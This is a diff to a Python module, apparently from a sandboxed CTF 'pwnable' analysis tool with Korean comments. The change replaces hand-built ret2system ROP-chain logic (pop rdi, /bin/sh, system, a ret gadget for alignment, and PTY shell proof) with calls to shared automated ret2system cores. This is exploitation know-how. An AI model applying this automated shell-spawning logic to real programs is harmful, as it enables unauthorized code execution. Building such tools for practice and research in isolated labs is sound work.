@@ -5,7 +5,6 @@ from __future__ import annotations
 import hashlib
 import logging
 import os
-import secrets
 import stat
 import tempfile
 from dataclasses import asdict, dataclass
@@ -26,7 +25,6 @@ from pwnable_lab.analyzer.gadgets import (
 from pwnable_lab.analyzer.got_plt import analyze_got_plt
 from pwnable_lab.analyzer.strategy import (
     analyze_strategy,
-    binary_exec_range,
     find_ret_gadget,
     inject_confirmed_offset,
     is_pie,
@@ -38,9 +36,8 @@ from pwnable_lab.analyzer.strings import extract_strings
 from pwnable_lab.analyzer.vuln_scan import scan_vulns
 from pwnable_lab.config import Settings
 from pwnable_lab.elf.parser import ElfImage, parse_elf
-from pwnable_lab.errors import AnalysisError, SandboxError
+from pwnable_lab.errors import AnalysisError
 from pwnable_lab.formats import ArtifactFormat, detect_format
-from pwnable_lab.payload.pack import RopStep, build_overflow
 from pwnable_lab.pe.analyzer import (
     disassemble_pe,
     disassemble_raw,
@@ -53,13 +50,14 @@ from pwnable_lab.sandbox import (
     SandboxLimits,
     auto_ret2libc_core,
     auto_ret2libc_in_container,
+    auto_ret2system_core,
+    auto_ret2system_in_container,
     confirm_offset_in_container,
     confirm_offset_in_process,
     require_isolation_marker,
     require_sandbox_enabled,
     verify_exploit_in_container,
     verify_exploit_in_process,
-    verify_shell,
 )
 
 logger = logging.getLogger(__name__)
@@ -359,9 +357,8 @@ class AnalysisService:
             if attempts[-1]["succeeded"]:
                 return self._with_attempts(attempts[-1], attempts)
 
-        plan = ret2system_plan(image)
-        if plan is not None:
-            attempts.append(self._try_ret2system(data, offset, image, plan, bits))
+        if ret2system_plan(image) is not None:
+            attempts.append(self._auto_ret2system(data, offset))
             if attempts[-1]["succeeded"]:
                 return self._with_attempts(attempts[-1], attempts)
 
@@ -412,76 +409,19 @@ class AnalysisService:
             "result": result,
         }
 
-    def _try_ret2system(
-        self, data: bytes, offset: int, image, plan: dict, bits: int
-    ) -> dict:
-        """pop rdi → /bin/sh → system 체인이 실제로 system() 으로 제어를 넘기는지 확인.
+    def _auto_ret2system(self, data: bytes, offset: int) -> dict:
+        """완전 자동 ret2system 을 executor 별로 위임한다(셸 획득까지 증명).
 
-        비대화형 샌드박스에서는 spawn 된 셸에 명령을 흘려 넣기 어렵고(대상 stdio
-        버퍼링), system() 리턴 뒤 복귀주소가 없어 크래시하므로 stdout 마커로
-        "셸 획득"을 증명하기 어렵다. 대신 **제어가 바이너리 밖(libc 의 system)으로
-        이전**됐는지(크래시 RIP 가 바이너리 실행범위 밖)를 성공 신호로 쓴다.
-        정렬(movaps) 때문에 첫 시도가 바이너리 안에서 죽으면 ret 가젯을 끼워 재시도.
+        오케스트레이션 전체가 공유 코어(`sandbox/ret2system.py`)이고 PTY 셸 증명이
+        로컬 실행이라, container 는 컨테이너 안의 CLI `--auto-ret2system` 로,
+        inprocess 는 temp 파일에 코어를 직접 돌려 **양쪽 모두 셸을 증명**한다.
         """
 
-        pop_rdi, binsh, system = plan["pop_rdi"], plan["binsh"], plan["system"]
-        rng = binary_exec_range(image)
-
-        def reached_system(result: dict) -> bool:
-            rip = result.get("observation", {}).get("rip")
-            return rip is not None and rng is not None and not (rng[0] <= rip < rng[1])
-
-        chains = [[binsh, system]]
-        ret = find_ret_gadget(image)
-        if ret is not None:
-            chains.append([binsh, ret, system])  # movaps 정렬 변형
-
-        best: dict = {}
-        reached: tuple[dict, bool, dict | None] | None = None
-        for i, chain in enumerate(chains):
-            result = self.verify_exploit(
-                data, offset=offset, target=pop_rdi, chain=chain, bits=bits
+        if self.settings.sandbox_executor == "container":
+            return auto_ret2system_in_container(
+                data, offset=offset, settings=self.settings
             )
-            best = result
-            if not reached_system(result):
-                continue
-            # 제어가 system 에 도달했으면, in-process 에서는 PTY 로 셸이 실제
-            # 명령을 실행하는지까지 증명한다(휴리스틱 → 증거로 승격). 정렬(movaps)
-            # 때문에 정렬 없는 체인은 do_system 에서 죽어 셸이 안 뜰 수 있으므로,
-            # 도달하는 각 체인마다 증명을 시도하고 증명되는 체인을 우선한다.
-            proof = self._prove_shell(data, offset, pop_rdi, chain, bits)
-            if proof and proof["shell_spawned"]:
-                return self._ret2system_report(
-                    plan, i > 0, True, "shell-proven", result, proof
-                )
-            if reached is None:
-                reached = (result, i > 0, proof)
-        if reached is not None:
-            result, alignment, proof = reached
-            return self._ret2system_report(
-                plan, alignment, True, "control-into-system", result, proof
-            )
-        return self._ret2system_report(
-            plan, False, False, "did-not-reach-system", best, None
-        )
-
-    def _prove_shell(
-        self, data: bytes, offset: int, target: int, chain: list[int], bits: int
-    ) -> dict | None:
-        """PTY 로 ret2system payload 가 실제 셸을 띄우고 명령을 실행하는지 증명.
-
-        대화형 tty 라인 규율이 파이프의 stdio 버퍼링 문제를 우회하므로, spawn 된
-        셸에 ``echo <marker>`` 를 흘려 marker 를 회수하면 셸 획득이 증명된다.
-        콜백/PTY 기반이라 무상태 컨테이너 CLI 로는 아직 노출돼 있지 않아
-        in-process executor 에서만 수행한다.
-        """
-
-        if self.settings.sandbox_executor != "inprocess" or bits != 64:
-            return None
-        marker = "PWNPILOT_" + secrets.token_hex(4)
-        payload = build_overflow(
-            offset, target, bits=bits, chain=[RopStep(a) for a in chain]
-        )
+        require_isolation_marker(self.settings)
         limits = SandboxLimits(
             wall_seconds=self.settings.sandbox_wall_seconds,
             cpu_seconds=self.settings.sandbox_cpu_seconds,
@@ -489,43 +429,12 @@ class AnalysisService:
         )
         path = self._materialize(data)
         try:
-            return verify_shell(path, payload, marker=marker, limits=limits).as_dict()
-        except SandboxError:
-            return None
+            return auto_ret2system_core(path, offset=offset, limits=limits)
         finally:
             try:
                 os.unlink(path)
             except OSError:
                 pass
-
-    @staticmethod
-    def _ret2system_report(
-        plan: dict,
-        alignment: bool,
-        succeeded: bool,
-        reason: str,
-        result: dict,
-        shell_proof: dict | None,
-    ) -> dict:
-        report = {
-            "attempted": True,
-            "technique": "ret2system",
-            "pop_rdi_hex": f"0x{plan['pop_rdi']:x}",
-            "binsh_hex": f"0x{plan['binsh']:x}",
-            "system_hex": f"0x{plan['system']:x}",
-            "alignment_ret_gadget": alignment,
-            "succeeded": succeeded,
-            "reason": reason,
-            "shell_proven": bool(shell_proof and shell_proof["shell_spawned"]),
-            "note": (
-                "제어가 system() 으로 이전됨(rdi=/bin/sh). shell_proven=true 면 "
-                "PTY 로 spawn 된 셸이 실제 명령(echo marker)을 실행함을 확인했다."
-            ),
-            "result": result,
-        }
-        if shell_proof is not None:
-            report["shell_proof"] = shell_proof
-        return report
 
     def verify_exploit(
         self,
